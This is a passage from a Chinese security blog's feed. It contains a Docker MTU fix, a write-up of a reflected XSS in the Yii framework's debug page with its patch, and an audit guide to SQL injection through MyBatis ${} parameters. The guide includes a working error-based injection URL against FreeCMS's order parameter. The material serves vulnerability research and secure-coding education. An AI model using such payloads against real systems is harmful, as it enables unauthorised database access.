</code></pre><p>先在docker-compose.yml中配置如下：</p>
<pre><code>networks：
 <span class="keyword">default</span>:
  mtu: <span class="number">1450</span>
</code></pre><p>发现并没有效果。使用docker network inspect compose-default 查看，参数一栏写的是：</p>
<pre><code><span class="string">"mtu"</span>: <span class="string">"1450"</span>
</code></pre><p>注意到之前在bridge中，参数一栏是”com.docker.network.driver.mtu”，所以尝试修改docker-compose.yml文件中参数为：</p>
<pre><code>networks:
 default:
  com<span class="class">.docker</span><span class="class">.network</span><span class="class">.driver</span><span class="class">.mtu</span>: <span class="number">1450</span>
</code></pre><p>重启生效。</p>
<h2 id="解决方案">解决方案</h2><p>所以在docker-compose.yml文件中修改networks的参数mtu为1450即可。</p>
<p>疑问：</p>
<p>docker0显示的mtu并不会发生改变。看到一些文档里写的是修改docker0属性，可能是对于docker0的理解有误。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;问题&quot;&gt;问题&lt;/h2&gt;&lt;p&gt;虚拟机上安装docker之后，docker容器内无法访问外网。DNS解析和部分http可以通信。&lt;/p&gt;
&lt;p&gt;虚拟机版本为：ubuntu 14.04&lt;br&gt;docker版本为：17.07.0-ce&lt;br&gt;虚拟环境为：openstack
    
    </summary>
    
      <category term="折腾不止" scheme="http://xdxd.love/categories/%E6%8A%98%E8%85%BE%E4%B8%8D%E6%AD%A2/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-11516 yii框架开发模式导致的通用性反射XSS</title>
    <link href="http://xdxd.love/2017/08/03/yii%E6%A1%86%E6%9E%B6%E5%BC%80%E5%8F%91%E6%A8%A1%E5%BC%8F%E5%AF%BC%E8%87%B4%E7%9A%84%E9%80%9A%E7%94%A8%E6%80%A7%E5%8F%8D%E5%B0%84XSS/"/>
    <id>http://xdxd.love/2017/08/03/yii框架开发模式导致的通用性反射XSS/</id>
    <published>2017-08-03T08:42:28.000Z</published>
    <updated>2017-10-30T03:12:31.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/yiixss5.png" alt=""></p>
<h2 id="漏洞测试">漏洞测试</h2><p>测试版本：最新版2.0.10</p>
<p>当Yii框架开启了debug和dev模式的时候，报错页面存在通用性的反射XSS。Yii提供的demo中默认是开启了dev模式的。</p>
<pre><code><span class="comment">// comment out the following two lines when deployed to production</span>
defined(<span class="string">'YII_DEBUG'</span>) <span class="subst">or</span> <span class="class"><span class="keyword">define</span></span>(<span class="string">'YII_DEBUG'</span>, <span class="literal">true</span>);
defined(<span class="string">'YII_ENV'</span>) <span class="subst">or</span> <span class="class"><span class="keyword">define</span></span>(<span class="string">'YII_ENV'</span>, <span class="string">'dev'</span>);
</code></pre><p>虽然有提示说正式发布到线上需要关闭。但是由于众所周知的原因，总是会有人在线上开启了dev模式。</p>
<p><img src="/images/yiixss1.png" alt=""></p>
<p>如图所示，由于报错页面的输出的环境变量的信息，没有做转移，直接写入页面导致的反射XSS。</p>
<h2 id="代码分析">代码分析</h2><p>使用vscode和php debug插件进行代码调试。触发异常之后的调用过程如下。</p>
<p><img src="/images/yiixss2.png" alt=""></p>
<pre><code>/**
* Renders the global variables <span class="keyword">of</span> the request.
* List <span class="keyword">of</span> global variables is defined <span class="keyword">in</span> [[displayVars]].
* @<span class="keyword">return</span> string the rendering result
* @see displayVars
*/
public <span class="keyword">function</span> renderRequest()
{
    <span class="variable">$request</span> = <span class="string">''</span>;
    foreach (<span class="variable">$this-</span>&gt;displayVars as <span class="variable">$name</span>) {
        if (!empty(<span class="variable">$GLOBALS</span>[<span class="variable">$name</span>])) {
            <span class="variable">$request</span> .= <span class="string">'$'</span> . <span class="variable">$name</span> . <span class="string">' = '</span> . VarDumper::export(<span class="variable">$GLOBALS</span>[<span class="variable">$name</span>]) . <span class="string">";\n\n"</span>;
        }
    }

    return <span class="string">'&lt;pre&gt;'</span> . rtrim(<span class="variable">$request</span>, <span class="string">"\n"</span>) . <span class="string">'&lt;/pre&gt;'</span>;
}
</code></pre><p>请求中的参数会直接输出。导致了XSS。</p>
<h2 id="修复方式">修复方式</h2><p>Yii框架本身有各种安全的函数。这里可以采用</p>
<pre><code>use yii\helpers\Html;
    <span class="keyword">return</span> <span class="string">'&lt;pre&gt;'</span> . rtrim(**Html::encode(<span class="variable">$request</span>)**, <span class="string">"\n"</span>) . <span class="string">'&lt;/pre&gt;'</span>;
</code></pre><p>的方式解决XSS的问题。<br><img src="/images/yiixss3.png" alt=""></p>
<h2 id="总结思考">总结思考</h2><p>一个问题是debug模式下的安全问题是否是安全漏洞。可能的有的观点是框架都已经建议开发者在线上关闭debug模式了。我觉得评判的标准应该是这个问题是否可以利用，是否存在危害。<br>只有debug模式才存在只是大幅减少了漏洞的影响面，而不能否认漏洞本身。可以参考struts2开发模式存在的安全问题。比较巧的是struts2开发模式也出现过XSS的问题。<br><!-- ![](/images/yiixss4.png) --></p>
<h2 id="漏洞报告">漏洞报告</h2><p>20170116 邮件汇报给Yii官方<br>20170118 得到确认<br><img src="/images/yiixss4.png" alt=""><br>20170721 发布patch</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;/images/yiixss5.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;h2 id=&quot;漏洞测试&quot;&gt;漏洞测试&lt;/h2&gt;&lt;p&gt;测试版本：最新版2.0.10&lt;/p&gt;
&lt;p&gt;当Yii框架开启了debug和dev模式的时候，报错页面存在通用性的反射XSS。Yii提供的
    
    </summary>
    
      <category term="cve and others" scheme="http://xdxd.love/categories/cve-and-others/"/>
    
    
  </entry>
  
  <entry>
    <title>审计mybatis的sql注入</title>
    <link href="http://xdxd.love/2017/05/24/%E5%AE%A1%E8%AE%A1mybatis%E7%9A%84sql%E6%B3%A8%E5%85%A5new/"/>
    <id>http://xdxd.love/2017/05/24/审计mybatis的sql注入new/</id>
    <published>2017-05-24T07:27:24.000Z</published>
    <updated>2017-05-24T06:42:22.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="mybatis_概述">mybatis 概述</h1><p><a href="http://www.mybatis.org/" target="_blank" rel="external">MyBatis</a>是支持定制化 SQL、存储过程以及高级映射的优秀的持久层框架。MyBatis 避免了几乎所有的 JDBC 代码和手动设置参数以及获取结果集。MyBatis 可以对配置和原生Map使用简单的 XML 或注解，将接口和 Java 的 POJOs(Plain Old Java Objects,普通的 Java对象)映射成数据库中的记录</p>
<h1 id="mybatis存在的sql注入问题">mybatis存在的sql注入问题</h1><p>mybatis避免了用户直接拼接SQL语句，但是认为只要使用了mybatis就可以杜绝SQL注入的观点是不正确的。mybatis在配置SQL语句的时候，有两种描述参数的方式。<code>#{}</code>和<code>${}</code>。</p>
<p>比如：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"selectPerson"</span> parameterType=<span class="string">"int"</span> resultType=<span class="string">"hashmap"</span>&gt;
  <span class="keyword">SELECT</span> * <span class="keyword">FROM</span> PERSON <span class="keyword">WHERE</span> ID = <span class="preprocessor">#{id}</span>
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这个语句被称作 selectPerson，接受一个 int（或 Integer）类型的参数，并返回一个 HashMap类型的对象，其中的键是列名，值便是结果行中的对应值。</p>
<p>注意参数符号：</p>
<pre><code>#{<span class="ruby">id}</span>
</code></pre><p>这就告诉 MyBatis 创建一个预处理语句参数，通过 JDBC，这样的一个参数在 SQL中会由一个“?”来标识，并被传递到一个新的预处理语句中，就像这样：</p>
<pre><code>// Similar JDBC <span class="preprocessor">code</span>, NOT MyBatis…
<span class="keyword">String </span><span class="keyword">selectPerson </span>= <span class="string">"SELECT * FROM PERSON WHERE ID=?"</span><span class="comment">;</span>
<span class="label">PreparedStatement</span> ps = conn.prepareStatement(<span class="keyword">selectPerson);
</span><span class="label">ps.setInt</span>(<span class="number">1</span>,id)<span class="comment">;</span>
</code></pre><p>使用<code>#</code>mybatis会使用预编译来处理参数，这样子可以避免SQL注入。</p>
<p>但是使用<code>$</code>描述参数会直接把变量拼接到SQL语句中，不做任何处理。相当于直接字符串拼接SQL。这样的方式就可能存在SQL注入。下面的描述来自mybatis官方文档。</p>
<pre><code>默认情况下,使用#{}格式的语法会导致 MyBatis 创建预处理语句属性并安全地设置值（比如?）。这样做更安全，更迅速，通常也是首选做法，不过有时你只是想直接在 SQL 语句中插入一个不改变的字符串。比如，像 <span class="keyword">ORDER</span> <span class="keyword">BY</span>，你可以这样来使用：

<span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="label">${columnName}</span>
这里 MyBatis 不会修改或转义字符串。

<span class="keyword">NOTE</span> 以这种方式接受从用户输出的内容并提供给语句中不变的字符串是不安全的，会导致潜在的 SQL 注入攻击，因此要么不允许用户输入这些字段，要么自行转义并检验。
</code></pre><h1 id="demo演示">demo演示</h1><p>使用<a href="http://www.cnblogs.com/zhanjindong/p/3397828.html" target="_blank" rel="external">MyBatis使用示例</a>作为demo测试。</p>
<p>mapper文件：</p>
<pre><code><span class="pi">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span>
<span class="doctype">&lt;!DOCTYPE mapper
        PUBLIC "-//mybatis.org//DTD Mapper 3.0//EN"
        "http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;</span>
<span class="tag">&lt;<span class="title">mapper</span> <span class="attribute">namespace</span>=<span class="value">"test.mybatis.UserMapper"</span>&gt;</span>
    <span class="comment">&lt;!-- 这里namespace必须是UserMapper接口的路径” --&gt;</span>
    <span class="tag">&lt;<span class="title">insert</span> <span class="attribute">id</span>=<span class="value">"insertUser"</span> <span class="attribute">parameterType</span>=<span class="value">"User"</span>&gt;</span>
        insert into user(name,age) values(#{name},#{age})
        <span class="comment">&lt;!-- 这里sql结尾不能加分号，否则报“ORA-00911”的错误 --&gt;</span>
    <span class="tag">&lt;/<span class="title">insert</span>&gt;</span>
    <span class="comment">&lt;!-- 这里的id必须和UserMapper接口中的接口方法名相同 --&gt;</span>
    <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"getUser"</span> <span class="attribute">resultType</span>=<span class="value">"User"</span>&gt;</span>
        select * from user where name=#{name}
    <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
<span class="tag">&lt;/<span class="title">mapper</span>&gt;</span>
</code></pre><p>在输入中插入单引号</p>
<pre><code><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">getUser</span>(<span class="params"></span>) </span>{
    SqlSession sqlSession = sqlSessionFactory.openSession();
    <span class="keyword">try</span> {
        UserMapper userMapper = sqlSession.getMapper(UserMapper.class);
        User user = userMapper.getUser(<span class="string">"'zhangsan"</span>);
        System.<span class="keyword">out</span>.println(<span class="string">"name: "</span> + user.getName() + <span class="string">"|age: "</span>
                + user.getAge());
    } <span class="keyword">finally</span> {
        sqlSession.close();
    }
</code></pre><p>查看执行的sql语句：</p>
<p><img src="/images/mybatis21.png" alt=""></p>
<p>可以看到输入被单引号包裹，并且对字符串中的单引号进行了转义。</p>
<p>将<code>#</code>改成<code>$</code>,mapper文件为：</p>
<pre><code>&lt;<span class="keyword">select</span> id=<span class="string">"getUser"</span> resultType=<span class="string">"User"</span>&gt;
    <span class="keyword">select</span> * <span class="keyword">from</span> user <span class="keyword">where</span> name=${_parameter}
&lt;/<span class="keyword">select</span>&gt;
</code></pre><p>这里由于代码的写法问题，name需要改成_parameter,参考<a href="http://woshixy.blog.51cto.com/5637578/1180914" target="_blank" rel="external">Mybatis中传参包There is no getter for property named XXX in class java.lang.String</a>。</p>
<p>查看执行的SQL语句：</p>
<p><img src="/images/mybatis22.png" alt=""></p>
<p>输入没有任何改变的拼接到SQL中，造成了SQL注入。</p>
<h1 id="实战分析">实战分析</h1><p>mybatis generator插件默认生成的order by 条件是使用<code>$</code>表示变量。</p>
<pre><code>...
 <span class="tag">&lt;<span class="title">select</span> <span class="attribute">id</span>=<span class="value">"selectByExample"</span> <span class="attribute">resultMap</span>=<span class="value">"BaseResultMap"</span> <span class="attribute">parameterType</span>=<span class="value">"com.tgwoo.ctspmt.model.MtVMsgItemExample"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectPrefix"</span> /&gt;</span>
    select
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"distinct"</span> &gt;</span>
      distinct
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Base_Column_List"</span> /&gt;</span>
    from CTSPMT.MT_V_MSG_ITEM
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"_parameter != null"</span> &gt;</span>
      <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"Example_Where_Clause"</span> /&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"orderByClause != null"</span> &gt;</span>
      order by ${orderByClause}
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
    <span class="tag">&lt;<span class="title">include</span> <span class="attribute">refid</span>=<span class="value">"OracleDialectSuffix"</span> /&gt;</span>
  <span class="tag">&lt;/<span class="title">select</span>&gt;</span>
...
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectPrefix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      select * from ( select row_.*, rownum rownum_ from ( 
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
  <span class="tag">&lt;<span class="title">sql</span> <span class="attribute">id</span>=<span class="value">"OracleDialectSuffix"</span> &gt;</span>
    <span class="tag">&lt;<span class="title">if</span> <span class="attribute">test</span>=<span class="value">"page != null"</span> &gt;</span>
      <span class="cdata">&lt;![CDATA[ ) row_ ) where rownum_ &gt; #{page.begin} and rownum_ &lt;= #{page.end} ]]&gt;</span>
    <span class="tag">&lt;/<span class="title">if</span>&gt;</span>
  <span class="tag">&lt;/<span class="title">sql</span>&gt;</span>
...
</code></pre><p>所以使用mybatis generator插件生成的代码中，需要自己过滤order by参数，如果用户可控就会导致SQL注入。而大部分情况下，开发者可能没有意识到这个问题。</p>
<p>以freecms为例。<a href="http://www.freeteam.cn/" target="_blank" rel="external">Freecms</a>是一款开源javacms。最新版下载<a href="http://www.freeteam.cn/freecms1.5.rar" target="_blank" rel="external">地址</a>。freecms中的orderby都是使用的<code>$</code>描述变量。</p>
<p><img src="/images/mybatis23.png" alt=""></p>
<p>前面的分析可以知道，这种情况，mybatis会直接拼接字符串到SQL中不做任何处理。</p>
<p>注册用户登录访问：</p>
<pre><code>http://192.168.99.100:8080/freecms/member/creditlog_list.do?order=extractvalue(1,concat(0x7C,(select%20user()),0x7C))
</code></pre><p><img src="/images/mybatis24.png" alt=""></p>
<p>查看执行的SQL为：</p>
<p><img src="/images/mybatis25.png" alt=""></p>
<h1 id="修复方案">修复方案</h1><p>尽量使用<code>#</code>描述参数，如果一定要使用<code>$</code>，则需要自己过滤用户输入。</p>
<h1 id="容易发生注入的点">容易发生注入的点</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q#rd" target="_blank" rel="external">Mybatis框架下SQL注入漏洞面面观</a>中提到了3个点。</p>
<pre><code>1. 模糊查询like SQL注入修复建议
按照新闻标题对新闻进行模糊查询，可将SQL查询语句设计如下：
<span class="operator"><span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> tile <span class="keyword">like</span> <span class="keyword">concat</span>(‘%’,#{title}, ‘%’)，
采用预编译机制，避免了<span class="keyword">SQL</span>语句拼接的问题，从根源上防止了<span class="keyword">SQL</span>注入漏洞的产生。

<span class="number">2.</span>  <span class="keyword">in</span>之后的参数<span class="keyword">SQL</span>注入修复建议
在对新闻进行同条件多值查询的时候，可使用Mybatis自带循环指令解决<span class="keyword">SQL</span>语句动态拼接的问题：
<span class="keyword">select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> <span class="keyword">id</span> <span class="keyword">in</span>
&lt;foreach collection=<span class="string">"ids"</span> item=<span class="string">"item"</span> <span class="keyword">open</span>=<span class="string">"("</span>separator=<span class="string">","</span> <span class="keyword">close</span>=<span class="string">")"</span>&gt;#{item} &lt;/foreach&gt;

<span class="number">3.</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">SQL</span>注入修复建议<span class="comment">--在Java层面做映射</span>
预编译机制只能处理查询参数，其他地方还需要研发人员根据具体情况来解决。如前面提到的排序情景： <span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘京东’ <span class="keyword">order</span> <span class="keyword">by</span> #{<span class="keyword">time</span>} <span class="keyword">asc</span>，这里<span class="keyword">time</span>不是查询参数，无法使用预编译机制，只能这样拼接：<span class="keyword">Select</span> * <span class="keyword">from</span> news <span class="keyword">where</span> title =‘京东’ <span class="keyword">order</span> <span class="keyword">by</span> ${<span class="keyword">time</span>} <span class="keyword">asc</span> 。
针对这种情况研发人员可以在<span class="keyword">java</span>层面做映射来进行解决。如当存在发布时间<span class="keyword">time</span>和点击量click两种排序选择时，我们可以限制用户只能输入<span class="number">1</span>和<span class="number">2</span>。当用户输入<span class="number">1</span>时，我们在代码层面将其映射为<span class="keyword">time</span>，当用户输入<span class="number">2</span>时，将其映射为click。而当用户输入<span class="number">1</span>和<span class="number">2</span>之外的其他内容时，我们可以将其转换为默认排序选择<span class="keyword">time</span>(或者click)。</span>
</code></pre><p>目前在使用mybatis中，一般会使用插件自动生成代码。插件自动生成的代码中，in语句已经是默认安全的方式了。只有orderby和limit处是使用字符串拼接。而默认情况下应该是没有like语句。如果程序员需要使用like需要自己实现。</p>
<p><img src="/images/mybatisa1.png" alt=""></p>
<p><img src="/images/mybatisa2.png" alt=""></p>
<h1 id="参考资料">参考资料</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MjM5OTk2MTMxOQ==&amp;mid=2727827368&amp;idx=1&amp;sn=765d0835f0069b5145523c31e8229850&amp;mpshare=1&amp;scene=1&amp;srcid=0926a6QC3pGbQ3Pznszb4n2q#rd" target="_blank" rel="external">Mybatis框架下SQL注入漏洞面面观</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;mybatis_概述&quot;&gt;mybatis 概述&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;http://www.mybatis.org/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;MyBatis&lt;/a&gt;是支持定制化 SQL、存储过程以及高级映射的优秀的持
    
    </summary>
    
      <category term="代码审计" scheme="http://xdxd.love/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
      <category term="java" scheme="http://xdxd.love/tags/java/"/>
    
  </entry>
  
</feed>
